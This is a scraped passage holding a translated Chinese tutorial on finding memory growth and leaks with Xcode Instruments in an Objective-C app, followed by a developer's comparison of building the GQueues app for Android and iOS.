                                  completionHandler:^(UIImage *image) {
                                      self.imageView.image = image;
                                      [self setNeedsLayout];
                                  }];
}
</code></pre>

<p>修改好厚,在仪器重新运行该应用程序Product—Profile（或⌘I-记住，这些快捷键真的会为您节省一些时间）。<br>
请注意，这个时候会再问一次你是否使用一起。这是因为你还有一个窗口中打开这个程序，及仪器假定您要使用相同的选项再次运行。<br>
执行一些更多的搜索，并注意此时用户界面不是那么卡顿了！这些图像现在异步加载，并缓存在后台，所以一旦他们已经被下载一次，他们不必再次下载。<br>
看上去很不错！是时候发布了吗? 当然还不够</p>

<h3>分配，分配，分配</h3>

<p>接下来的仪器是分配工具。它能给出你所有创建和存储它们的内存的详细信息，它也显示你保留了每个对象的计数。</p>

<p>关闭仪器，回到Xcode和选择Product-&gt;Profile。然后，从选择器分配并单击配置文件。如下图:<br><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbMQY"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span></p>

<p>程序再次打开 然后你会看到<br><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbMQZ"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span></p>

<p>这个时候你会发现两个曲目。一个叫(分配)Allocations，以及一个被称为VM Tracker(虚拟机跟踪)。该分配轨道将详细在本教程中讨论;虚拟机跟踪也是非常有用的，但更复杂一点。<br>
所以你的错误会追踪下？<br>
有隐藏的项目，你可能不知道有东西在那儿。你可能已经听说了内存泄漏。但你可能不知道的是，其实有两种泄漏。<br>
第一个是真正的内存泄漏，一个对象尚未被释放，但是不再被引用的了。因此，存储器不能被重新使用。<br>
第二类泄漏是比较麻烦一些。这就是所谓的“无界内存增长”。这发生在内存继续分配，并永远不会有机会被释放。<br>
如果永远这样下去你的程序占用的内存会无限大,当超过一定内存的话 会被系统的看门狗给kill掉.</p>

<p>建立一个场景，你可以检测出无限的内存增长。首先，在应用程序使10个不同的搜索（不要用已经存在的搜索）。确保搜索的一些结果！现在让程序等待几秒钟。</p>

<p>你应该已经注意到，在分配的轨道图不断上升。这是告诉你的,内存被分配了。它的这一特征，将引导你找到无限的内存增长。<br>
你将要执行的是“heap shot analysis”。为此，按这个按钮叫“Mark Heap”。你会发现的详细面板左侧的按钮<br><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbMQ0"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span></p>

<p>按下它，你会看到一个红色的标志出现在轨道上，像这样：<br><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbMQ1"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span></p>

<p>heap shot分析的目的是执行一个动作多次，看看如果内存是否无限增长。搜索一个内容，稍等几秒加载图像，然后返回主页。然后再标记堆。反复这样做不同的搜索。<br>
演戏几个搜索后，仪器会看起来像这样：<br><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbMQ2"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span></p>

<p>这时你应该会疑问。图中的蓝色是怎么回事了，你继续这样操作10次这样的搜索 蓝色还不断变高：<br>
那肯定是不好的。别急，有什么关于内存的警告？你知道这些，对不对？内存警告是告诉一个应用程序，内存警告是ios处理app最好的方式尤其是在内存越来越吃紧的时候,你需要清除一些内存。<br>
内存一直增长其实也不一定是你的代码除了问题,也有可能是UIKit 系统框架本身导致的.</p>

<p>通过选择HardwareSimulate内存警告在iOS模拟器的菜单栏模拟内存警告。你会发现，记忆体使用量出现小幅回落，但绝对不会回到它应该的。所以还是有无限的内存增长发生的地方。<br>
究其原因，堆出手做钻进搜索的每次迭代后，你可以看到内存的分配每个镜头之间。一起来看看在详细信息面板，你会看到一堆一堆的镜头。</p>

<p>在iOS模拟器的菜单栏中选择hardwaresimulate内存警告模拟内存警告。你会发现内存使用会出现小幅回落，但肯定不会回到它应该在的地方。<br>
每一次的搜索后做你可以看到内存已拍摄之间的分配。在详细信息面板看一看，你会看到一好多堆镜头。</p>

<h3>稳准狠</h3>

<p>第一个堆镜头作为参照,然后随便打开一个堆镜头,你会看到如下:<br><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbMQ3"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span></p>

<p>靠，这是一个很大的对象！从哪里开始看呢？<br>
最好的方式是通过列表，你在你的应用程序直接使用的类。在这种情况下，HTTPHeaderDict，CGRegion，CGPath，CFNumber，等等都是可以忽略了。<br>
但是，一个突出的是UIImage,这肯定是在你程序使用的。点击上的UIImage左侧的箭头显示的完整列表。选择一个，在扩展详细信息面板：<br><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbMQ4"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span></p>

<p>图中灰色的是系统库,黑色部分是你应用的代码,要获得此跟踪更多的上下文,双击唯一的黑框ImageCache方法,这时候将掉转到如下方法</p>

<pre><code>- (void)downloadImageAtURL:(NSURL*)url completionHandler:(ImageCacheDownloadCompletionHandler)completion {
    UIImage *cachedImage = [self imageForKey:[url absoluteString]];
    if (cachedImage) {
        completion(cachedImage);
    } else {
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
            NSData *data = [NSData dataWithContentsOfURL:url];
            UIImage *image = [UIImage imageWithData:data];
            [self setImage:image forKey:[url absoluteString]];
            dispatch_async(dispatch_get_main_queue(), ^{
                completion(image);
            });
        });
    }
}
</code></pre>

<p>工具是非常有用的,你现在要努力通过自己的代码思考发生了什么.看看通过上面的方法，你会看到它调用一个名为setImage方法：forKey：。这种方法在缓存以防它再次使用以后的应用程序的图像。啊！那么这肯定听起来像它可能是一个问题!<br>
一起来看看该方法的实现：</p>

<pre><code>- (void)setImage:(UIImage*)image forKey:(NSString*)key {
    [_cache setObject:image forKey:key];
}
</code></pre>

<p>从网络上下载一个图片添加字典中,你会注意到这些图片从来没有从字典清楚过<br>
,这就是内存为什么会一直增长,因为应用程序并不会从缓存里删除东西.它只会一直增加他们.<br>
要解决此问题,你需要的是ImageCache收到UIApplication内存吃紧的警告时.清理缓存.</p>

<p>为了使ImageCache能接收通知，修改ini​​t方法如下：</p>

<pre><code>- (id)init {
    if ((self = [super init])) {
        _cache = [NSMutableDictionary new];
        [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(memoryWarning:) name:UIApplicationDidReceiveMemoryWarningNotification object:nil];
    }
    return self;
}
</code></pre>

<p>注册UIApplicationDidReceiveMemoryWarningNotification执行memoryWarning：方法。</p>

<pre><code>- (void)memoryWarning:(NSNotification*)note {
    [_cache removeAllObjects];
}
</code></pre>

<p>memoryWarning删除缓存中的所有对象。这将确保没有持图像。<br>
为了测试此修复程序，再次启动仪器（从Xcode中有⌘I）和重复的步骤。不要忘了在模拟结束内存警告！</p>

<p><strong>注意：请确保您从Xcode中退出，重新构建，而不是仅仅点击仪器仪表上的红色按钮，以确保您使用的是最新的代码。</strong></p>

<p>这一次分析应该是这样的：</p>

<p>这个时候，内存受到内存警告后急剧下降。但还是有一些内存整体增长，但远不及像以前那样。<br>
究其原因还是有一定的增长确实是由于系统库，并没有太多可以做的。看来，系统库不释放所有的内存，这可能是由设计或可能是一个错误。你可以在你的应用程序做的是释放尽可能多的内存越好，你已经做到这一点！<br>
干得好！还有一个问题，修补了, - 仍然有泄漏，你还没有解决的第一种类型的问题。</p>

<h3>内存泄露</h3>

<p>内存泄漏的仪器。这是用来找到第一类泄漏前面提到的 - 当一个对象不再被引用时出现的那种<br>
检测泄漏是可以理解的一个很复杂的事情，但泄漏的工具记得，已分配的所有对象，并定期通过扫描每个对象以确定是否有任何不能从任何其他对象访问的。<br>
关闭仪器，回到Xcode和选择Product-&gt;Profile<br><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbMQ6"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span></p>

<p>回到你的应用程序！执行搜索，得到结果。然后点选结果的预览行打开全屏浏览器。按下旋转按钮在左上角，然后再按一次。<br>
回到仪器，等待片刻。如果你已经正确地完成上述步骤后，你会发现泄漏已经出现了！你的工具窗口将看起来像这样：<br><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbMQ7"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span></p>

<p>返回到模拟器，并按下旋转几次。然后返回到仪器和等会,得到如下结果：<br><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbMQ8"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span></p>

<p>哪来的泄漏从哪里来？扩展详细信息面板<br><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbMQN"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span></p>

<p>在扩展的详细信息面板打开CGContext上名单。在列表中选择CGContext上的元素之一，这表明导致要创建的对象，如下面的堆栈跟踪：<br><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbMQ9"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span></p>

<p>再次，涉及到你的代码中的帧显示为黑色。由于只有一个，双击它，看看代码的方法。<br>
有问题的方法是rotateTapped： ，这是被调用时被窃听旋转按钮的处理程序。这种方法旋转原始图像，并创建一个新的图像，如下：</p>

<pre><code>- (void)rotateTapped:(id)sender {
    UIImage *currentImage = _imageView.image;
    CGImageRef currentCGImage = currentImage.CGImage;

    CGSize originalSize = currentImage.size;
    CGSize rotatedSize = CGSizeMake(originalSize.height, originalSize.width);

    CGContextRef context = CGBitmapContextCreate(NULL,
                                                 rotatedSize.width,
                                                 rotatedSize.height,
                                                 CGImageGetBitsPerComponent(currentCGImage),
                                                 CGImageGetBitsPerPixel(currentCGImage) * rotatedSize.width,
                                                 CGImageGetColorSpace(currentCGImage),
                                                 CGImageGetBitmapInfo(currentCGImage));

    CGContextTranslateCTM(context, rotatedSize.width, 0.0f);
    CGContextRotateCTM(context, M_PI_2);
    CGContextDrawImage(context, (CGRect){.origin=CGPointZero, .size=originalSize}, currentCGImage);

    CGImageRef newCGImage = CGBitmapContextCreateImage(context);
    UIImage *newImage = [UIImage imageWithCGImage:newCGImage];

    self.imageView.image = newImage;
}
</code></pre>

<p>再次，仪器只能在这里给你一个提示，问题出在哪里，它不能告诉你确切位置的泄漏。这是唯一能够证明你在创建对象泄露的地方.你可能认为ARC并有不可能是造成代码中内存泄漏…对不对？<br>
回想一下，ARC只涉及Objective-C的对象。它不管理保留和的CoreFoundation对象而不是Objective-C的对象的释放。<br>
啊，现在它开始变得明显的问题是什么<br>
-CGContextRef和CGImageRef对象永远不会被释放！为了解决这个问题，在rotateTapped方法的末尾添加以下两行代码：</p>

<pre><code>CGImageRelease(newCGImage);
CGContextRelease(context);
</code></pre>

<p>这两种调用都需要来维护这两个对象的保留计数。这个说明，你还需要了解引用计数 - 即使你在你的项目中使用的ARC！<br>
从在Xcode中，使用⌘I工具构建和运行应用程序。<br>
在使用泄漏仪器仪器再看看应用程序，看看是否泄漏的被固定。如果你正确地遵循上述步骤，泄漏应消失！</p>

<hr>
<p>原文：<a rel=""nofollow"" href=""http://www.raywenderlich.com/23037/how-to-use-instruments-in-xcode"">How to Use Instruments in Xcode</a><br>
转载自：<a rel=""nofollow"" href=""http://hufeng825.github.io/2014/01/13/ios35/"">hufeng825.github.com</a> 作者：<a rel=""nofollow"" href=""http://weibo.com/hufengvip"">神一样的我啊</a></p>

                ", iOS 开发：用 Instruments 来检验你的app,1531972190,352,1,501,1,1,https://segmentfault.com/a/1190000000387082
196,1,0,6,"
                    <p>随便搜索一下“Android vs. iOS”，都会出现很多关于哪个平台更好的争论，大多数的争论点都是关于市场占有率、易用性和设备分化等问题。当然也有一些“以开发者的角度”去比较这两个平台的文章，但是很少有从技术上做深入的比较，通常也只是用一个简单的示例应用介绍一些基本的特性。缺少这种深入的比较其实是有原因的：一个公司要做一个足够复杂的移动应用，通常需要一个人或团队做Android，另外一个人或团队做iOS。这两个平台使用不同的编程语言（Java和Objective-C），提供不同的SDK，使用不同的开发工具，所以人力资源分配上各做各的平台也就不奇怪了。</p>

<p>GQueues是一个在线任务管理器，之前只有一个HTML5版本。最近我完成了GQueues for Android 和GQueues for iPhone &amp; iPad 的开发。虽然这两个应用的复杂程度不能和第一人称射击游戏相提并论，但也绝不简单 – 为用户存储和管理数以千计的任务信息、支持多账户、提供到WEB端的后台同步、复杂的过滤、排序和分组功能。通过这次的实践，我希望透过独特的视角，分析和比较为这两个平台开发GQueues应用的过程。</p>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbKJd"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span></p>

<h3>统计概况</h3>

<table>
<thead>
<tr>
  <th>--</th>
  <th>Android App</th>
  <th>iOS App</th>
</tr>
</thead>
<tbody>
<tr>
  <td>启动日期</td>
  <td>Sept 21, 2012</td>
  <td>Mar 2, 2013</td>
</tr>
<tr>
  <td>第一个可测的Beta版本</td>
  <td>Dec 22, 2012</td>
  <td>June 10, 2013</td>
</tr>
<tr>
  <td>应用发布日期</td>
  <td>Jan 31, 2013</td>
  <td>July 18, 2013</td>
</tr>
<tr>
  <td>项目总耗时</td>
  <td>4.25 months</td>
  <td>4.5 months</td>
</tr>
<tr>
  <td>Ramp Up Time</td>
  <td>1 week</td>
  <td>2 weeks</td>
</tr>
<tr>
  <td>开发耗时</td>
  <td>870 hours (approx)</td>
  <td>960 hours (approx)</td>
</tr>
<tr>
  <td>Beta测试&amp;Bugfix</td>
  <td>34 days</td>
  <td>38 days</td>
</tr>
<tr>
  <td>Beta测试人员人数</td>
  <td>92 people</td>
  <td>48 people</td>
</tr>
<tr>
  <td>代码行数</td>
  <td>26,981 lines</td>
  <td>23,872 lines</td>
</tr>
<tr>
  <td>应用大小</td>
  <td>1.1 MB</td>
  <td>3.5 MB</td>
</tr>
<tr>
  <td>视频预览</td>
  <td><a rel=""nofollow"" href=""https://www.youtube.com/watch?v=WBR1jUIzG78"">GQueues for Android Video</a></td>
  <td><a rel=""nofollow"" href=""https://www.youtube.com/watch?feature=player_embedded&amp;v=q9HCwrVIpLA"">GQueues for iOS Video</a></td>
</tr>
<tr>
  <td>下载</td>
  <td><a rel=""nofollow"" href=""https://play.google.com/store/apps/details?id=com.gqueues.android.app"">Google Play</a></td>
  <td><a rel=""nofollow"" href=""https://itunes.apple.com/us/app/gqueues/id658916407"">App Store</a></td>
</tr>
</tbody>
</table>

<h3>学习曲线</h3>

<p>我已经写了12年的代码，但这是我写的第一个Android应用，也是我写的第一个偏向数据处理的iOS应用（2010年我做过两个iOS 3上的游戏，但那两个游戏主要只涉及一些动画和蓝牙连接）。 我最后一次用Java是在研究生阶段，而我的Objective-C 也仅限于那两个游戏。所以对于这两个平台，我基本上可以算是从零开始。</p>

<p>简单讲，只需要花一半学习iOS的时间来学习Android，我就能开始Android开发。对于Android，我花了一周时间用来看书、跟着一些教程做一些测试应用，这些测试应用包含了GQueues将会用到的一些核心功能。做完这些，我基本上算是打好了为GQueues设计架构的基础，同时也可以开始为这个项目写代码了。在接下来的一周我可以很轻松自如地基于Android做开发，而不再需要依赖某个资源去实现新特性了。</p>

<p>对于iOS，我同样按照上面的流程，但我花了两周时间做各种测试/实验，才让自己觉得可以开始为这个项目写一些基础代码了。其中大部分的时间都花在研究CoreData各种复杂的API上面。搞清楚怎么设置、怎么在线程安全的前提下，为每个用户集中管理<a rel=""nofollow"" href=""https://developer.apple.com/library/ios/#documentation/Cocoa/Reference/CoreDataFramework/Classes/NSPersistentStoreCoordinator_Class/NSPersistentStoreCoordinator.html"">PersistentStoreCoordinators</a>和<a rel=""nofollow"" href=""https://developer.apple.com/library/ios/#documentation/Cocoa/Reference/CoreDataFramework/Classes/NSManagedObjectContext_Class/NSManagedObjectContext.html"">ManagedObjectContexts</a>也花了些功夫，最重要的是要支持多账户（这个话题可能需要另一篇博客来单独讲讲）。为 <a rel=""nofollow"" href=""http://developer.apple.com/library/ios/#DOCUMENTATION/CoreData/Reference/NSFetchedResultsController_Class/Reference/Reference.html"">FetchedResultsControllers</a>开发一个可扩展的架构花了更多时间，<a rel=""nofollow"" href=""http://developer.apple.com/library/ios/#DOCUMENTATION/CoreData/Reference/NSFetchedResultsController_Class/Reference/Reference.html"">FetchedResultsControllers</a>用于支持可被用户查看以及操作的任务表单、队列和分类。最后又过了两周（总共花了一个月）自己才能比较轻松自如地基于iOS写代码。</p>

<p>总的来说，Android的文档（官方文档、第三方教程、图书、代码示例、StackOverflow）质量都非常高。我从一些著名的开源Android应用中学到了很多架构上的最佳实践，如Google开放给开发者的2012 Google I/O app。此外，Android本身就是开源的，必要时我可以自己查看Android的平台代码，弄清楚一些疑难问题。虽然iOS也有很多文档，但由于iOS5和iOS6相比之前的版本改动非常大，大部分文档都已经过时，其中包括ARC入门一文（<a rel=""nofollow"" href=""http://developer.apple.com/library/ios/#releasenotes/ObjectiveC/RN-TransitioningToARC/Introduction/Introduction.html"">introduction of Automatic Reference Counting</a>）。因此，大部分的示例代码（包括Apple官方示例）和一些问题的解决方法都是不正确的，需要使用新的方法取而代之。搞清楚这些肯定也需要花更多的时间。</p>

<p>从上面的统计表中也可以看出，开发GQueues for Android要比开发 iOS 版的快十分之一的时间，尽管在开发Android版的期间我重新实现了之前用于支持GQueues HTML5版的整个后端服务器同步代码。而开发一个不采用原始iOS6风格UI的应用也需要多花些时间，单单比较这个数据，Android开发就是比iOS开发快。</p>

<h3>用到的资源</h3>

<p>Android 应用</p>

<ul>
<li><a rel=""nofollow"" href=""http://developer.android.com/guide/components/index.html"">Official Android docs</a></li>
<li><a rel=""nofollow"" href=""http://www.amazon.com/Professional-Android-4-Application-Development/dp/1118102274"">Professional Android 4 Application Development</a></li>
<li><a rel=""nofollow"" href=""http://www.amazon.com/Android-Recipes-Problem-Solution-Dave-Smith/dp/1430246146"">Android Recipes</a></li>
<li><a rel=""nofollow"" href=""http://www.amazon.com/Android-Database-Programming-Jason-Wei/dp/1849518122"">Android Database Programming</a></li>
<li><a rel=""nofollow"" href=""http://mobile.tutsplus.com/category/tutorials/android/"">Mobile Tuts+</a></li>
<li><a rel=""nofollow"" href=""https://code.google.com/p/iosched/"">Google I/O 2012 app code</a></li>
<li><a rel=""nofollow"" href=""http://stackoverflow.com/questions/tagged/android"">StackOverflow</a></li>
</ul>

<p>iOS 应用</p>

<ul>
<li><a rel=""nofollow"" href=""http://developer.apple.com/library/ios/navigation/"">Official iOS docs</a></li>
<li><a rel=""nofollow"" href=""http://www.amazon.com/Beginning-iOS-Development-Exploring-SDK/dp/1430245123"">Beginning iOS 6 Development</a></li>
<li><a rel=""nofollow"" href=""http://www.amazon.com/More-iOS-Development-Further-Explorations/dp/1430238070"">More iOS 6 Development</a></li>
<li><a rel=""nofollow"" href=""http://www.raywenderlich.com/store/ios-5-by-tutorials"">Ray Wenderlich’s iOS 5 by Tutorials</a></li>
<li><a rel=""nofollow"" href=""http://www.raywenderlich.com/store/ios-6-by-tutorials"">Ray Wenderlich’s iOS 6 by Tutorials</a></li>
<li><a rel=""nofollow"" href=""http://stackoverflow.com/questions/tagged/ios"">StackOverflow</a></li>
</ul>

<p>上面列出来的书其实用处很有限，因为跟大部分的技术类书籍一样，书的内容都有点过时了，而且大部分书只停留在入门级别的概念介绍。不过，在一开始的前几天看一下这些书，能够比较快地理解平台上的一些核心功能。就目前来讲，对于这两个平台，在线资源仍然是最有价值的。</p>

<h3>工具</h3>

<p>接下来我只简单说一下这两个平台的开发工具，因为关于这个话题已经有很多的讨论。我不是Eclipse或者XCode的脑残粉，它们有各自的强项和弱点（其实我最喜欢的还是Vim）。Eclipse的搜索暴慢而且很繁琐。XCode Organizer的文档搜索也卡爆了。Eclipse中使用log tags（通过Android插件的logcat集成）过滤日志超级实用。两个IDE的代码补全都很不错，XCode的Interface Builder一点用处都没有（后面细讲）。不过XCode Instruments就非常有用了，可以用它做优化分析、调试等等。我开始做GQueues for Android的时候，Google还没发布Android Studio，不过在GQueues的后续更新版本中我会拿它来试试。</p>

<p>如果你一边写代码一边测试，用Android的模拟器简直就是浪费时间（真不敢相信它能慢成这个鸟样）。在开发过程中，我都是直接部署到真机上测试的，用真机快很多。iOS的模拟器则很不同，跟Android相比简直就是火箭跟蜗牛赛跑，这也让整个开发过程更加高效。每写一小段代码我都会在模拟器上跑一下，等到整个功能完成了我就会部署到真机上玩玩。</p>

<p>对于Android，我有各个版本的测试机器（除了Gingerbread，即Android 2.3），除此之外，就要倚靠beta测试过程中各种设备的覆盖了。对于iOS来讲就要简单很多了，我只需要拿GQueues需要支持的最旧的和最新的机器来测试就够了。</p>

<h4>测试设备</h4>

<p>Android App</p>

<ul>
<li>Samsung Infuse (Froyo 2.2)</li>
<li>Nexus S (ICS 4.0.3)</li>
<li>Galaxy Nexus (Jelly Bean 4.2)</li>
<li>Samsung Galaxy Tab 10.1 (Honeycomb 3.2)</li>
<li>Nexus 7 (Jelly Bean 4.2)</li>
</ul>

<p>iOS App</p>

<ul>
<li>iPhone 4 (iOS 6)</li>
<li>iPhone 5 (iOS 6)</li>
<li>iPad 2 (iOS 6)</li>
<li>iPad 4th generation (iOS 6)</li>
</ul>

<h3>设计</h3>

<h4>布局</h4>

<p>GQueues的其中一个需求就是必须同时支持任意尺寸的手机和平板，并且针对不同的表单元素进行优化布局。由于各种各样的设备都运行着Android系统，Android也理所当然地有着成熟的UI组件帮助开发者支持各种尺寸。例如从Android第一个版本开始，RelativeLayout提供了View之间相对布局的支持，可用于创建灵活、响应迅速的布局。另外，在Android中所有的布局都由XML定义，这设计界面的方式非常简洁、简单并且高效，试过iOS中创建布局之后这种体会就更加深刻了。</p>

<p>相对于Android的RelativeLayout，iOS有Auto Layout，这种布局方式比较新（iOS 6新引入的），集成到了Interface Builder(IB)中，但是太难用了。我花了好多天学习IB中怎么用Auto Layout，跟任何iOS 6开发者一样，仅靠IB为视图（View）设定各种精确的约束，完全改变了我自己的标准，这是因为IB所谓的“智能”系统时刻维持（纠正）着视图布局相对位置。我学了很多技巧，想着弥补IB的短板，但是没啥作用。最后我只能放弃IB，转而用冗长的代码实现所有布局。如果你放弃IB和富有极客范的ASCII art style来写布局，使用Auto Layout来实现还是很强大、很直接的。希望苹果在iOS 7中已经改善这些，不过我还木有试过。</p>

<p>如果一个应用需要同时针对小屏设备和大屏设备进行优化，最关键的就是基于屏幕的真实尺寸进行动态组合视图，这种方式被称作“适配性布局(Adaptive Layout)”，平板电脑可以在一屏中显示两个或三个视图，而手机上一屏则只显示一个视图。Android通过Fragments支持这种设计，Fragment是一个独立的、自包含的的模块，能够在需要的时候直接丢到Activity中去用。通过使用Fragments，只需要调整几行XML代码就可以让GQueues的布局适配不同分辨率的屏幕。对于我来讲，Fragments是一种非常自然的解决方案，因为它是基于面向对象里面两个众所周知的准则设计的 - 高内聚和低耦合。</p>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbKJo"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span></p>

<p>通过Custom Container View Controller（你也可以用Master-Detail模板，当然这种方式宽度是固定的，也不支持个性化定制），iOS支持一屏使用多个ViewController。对于这个不成熟的特性，我觉得Apple的文档显得很复杂和不完整，最好的资源还要数Ray’s iOS5 tutorials和WWDC视频。我花了比预计要多的时间，终于搞好了在iPad上同时显示多个View、在iPhone上显示单个View的布局架构。</p>

<h3>设备翻转</h3>

<p>简单说，在Android上支持设备翻转需要做很多工作，这些工作也是最终导致很多bug的源头，而在iOS上，支持屏幕翻转只需要做一点点工作，剩下就是系统帮我们搞定了。在Android上，屏幕翻转会直接销毁现有整个视图栈（Activity栈），屏幕翻转完成后再重建每个视图。所以在GQueues中支持屏幕翻转，我需要无时无刻保存好所有当前状态，随时保证翻转后能正常恢复状态。而在iOS上，系统会帮你管理所有屏幕翻转相关的细节，唯一需要我关心的就是翻转之后，我需要调整那些没有被Auto Layout处理好的视图的位置。</p>

<h3>“复杂”布局</h3>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbKJq"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span></p>

<p>网页开发上有一些常见的布局在GQueues上实现起来非常困难，不管是Android还是iOS。其中一个例子是在任务详细界面显示标签。每个标签都是变长的，在必要时标签需要自动换行。在网页上实现这个只需要设置CSS的float值就可以了。但不管是Android还是iOS对这种“流式布局”（Flow Layout）都没有原生的支持，这也意味着我需要写很多代码自己去计算和摆放这些标签，以达到“流式布局”的效果。最后Android的代码是基于<a rel=""nofollow"" href=""http://www.parleys.com/play/514892280364bc17fc56c0e2/chapter38/about"">Romain Guy</a>的演讲内容和 <a rel=""nofollow"" href=""https://github.com/ApmeM/android-flowlayout"">Artem Votincev</a> 的flow layout实现的。在iOS上也采用了类似的方法，基于容器的总宽度，计算每个标签的宽度，最后设置auto layout的参数。对于这个布局的实现在两个平台上都耗了很大的工作量。</p>

<h3>旧设备支持</h3>

<p>关于Android的生态系统常被人吐槽的就是严重的系统分化。运营商推送更新的步伐总是很慢，所以现在仍有大量运行着旧系统的设备，这也就意味着如果要保证应用足够大的设备覆盖率，开发者就不能使用新版系统带来的新特性。不过好在现在针对这个问题，Android社区做了很大的努力，提供了一些用于在旧系统上支持新特性的库。通过使用Android官方的 <a rel=""nofollow"" href=""http://developer.android.com/tools/support-library/index.html"">Support Library</a>和Jake Wharton的<a rel=""nofollow"" href=""http://actionbarsherlock.com/"">ActionBarSherlock</a> Library，我几乎可以在Android 2.2上使用Jelly Bean（4.2）中所有的新特性。</p>

<p>对于iOS来说，支持旧系统一说几乎不存在，或者说根本就不是关键。在准备阶段我花了一些时间考虑从哪个iOS版本开始支持，而当时的统计数据显示使用iOS 6系统的设备已经达到 <a rel=""nofollow"" href=""http://appleinsider.com/articles/13/02/13/apples-ios-6-now-accounts-for-83-of-all-ios-based-traffic-in-north-america"">83%</a>，而当时对于放弃支持iPad一代我也有一些疑虑，因为我老爸老妈老姐用的就是iPad一代，他们将是GQueues的铁杆支持者。最后我决定还是只支持iOS 6+，这样我可以放开手使用Auto Layout，而不需要浪费大量时间实现任何过时的布局技术。当然，我解决了iPad一代的问题（至少对我家里人说来说已经解决），就是换掉他们的iPad一代，给他们每人买一个iPad四代（作者有钱银）。</p>

<h3>架构</h3>

<h4>数据存储和管理</h4>

<p>对于GQueues来说，数据是核心 - 把数据保存到设备上然后同步到WEB端。Android和iOS有着完全不同的数据管理系统。Android提供了ContentProvider，它是SQLite数据库上层的一个可被继承的应用接口，作为一个结构化框架被用于所有应用的数据处理。ContentProvider学习起来比较难，搞定一个GQueues可用的实现，前期需要花很多工作。一旦搞定了第一步后面的扩展和个性化定制都变得简单多了。</p>

<p>一些背景信息，GQueues的web service是基于 <a rel=""nofollow"" href=""https://developers.google.com/appengine/docs/python/datastore/"">Google App Engine’s Datastore</a> 的，这是一个高扩展性的分布式NoSQL存储系统，而SQLite则是一个标准的关系型数据库，扩展性明显也比较差，但这完全不需要考虑，因为这个应用只存储一个用户的数据。（顺便说一下，架构上我采用了“一个用户对应一个数据库”的设计，这对于快速简单地实现多用户切换有重要意义，不过实现细节可能得再开一博来聊了）。不管怎么说，Android的一个很大的优点就是可以创建 <a rel=""nofollow"" href=""http://www.sqlite.org/lang_createview.html"">SQLite Views</a>来支持Smart Queues。为了支持 <a rel=""nofollow"" href=""http://www.gqueues.com/help/smartQueues"">Smart Queues</a>，搞清楚各种复杂的表关联查询和子查询也花了写功夫，但是这也让Smart Queues的加载更加高效和快速，因为过滤不是在代码里面实现的（在SQL里面）。</p>

<p>在iOS上，我用的是 <a rel=""nofollow"" href=""https://developer.apple.com/library/ios/#documentation/DataManagement/Conceptual/iPhoneCoreData01/Introduction/Introduction.html"">Core Data</a>，它是iOS上的“schema驱动数据图形管理和持久化框架”，基本上它可以被看做是一个NoSQL存储，不过有趣的是，Core Data背后实际上是SQLite数据库（呃…实际上SQLite也是几个可选项中最合理的选择）。iOS也允许用户直接创建SQLite数据库，但只支持通过纯C代码来操作，对于其他iOS组件没有原生集成。Core Data的学习起来也比较困难，但最后我还是选择Core Data而不用SQLite，因为这样我可以轻松实现很多功能，包括缓存、数据模型迁移支持，还有通过 NSFetchedResultsController，可以非常简单地为界面中的table（列表）提供数据。</p>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbKJw"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span></p>

<p>管理数据集的关键就是使用事务，尤其重要是做数据同步的时候 - ACID，即：atomic（原子性）、consistent（一致性）、isolated（隔离性）、durable（持久性）。Android上实现事务似很直观，跟大部分关系型数据库管理系统的实现方式是一样的，因此，保证数据完整性并不困难。另外，用好SQLite中的UNIQUE <a rel=""nofollow"" href=""http://www.sqlite.org/lang_conflict.html"">ON CONFLICT</a> REPLACE语句，在数据同步的过程中建表、对记录进行原子更新的时候几乎不需要做任何额外工作。</p>

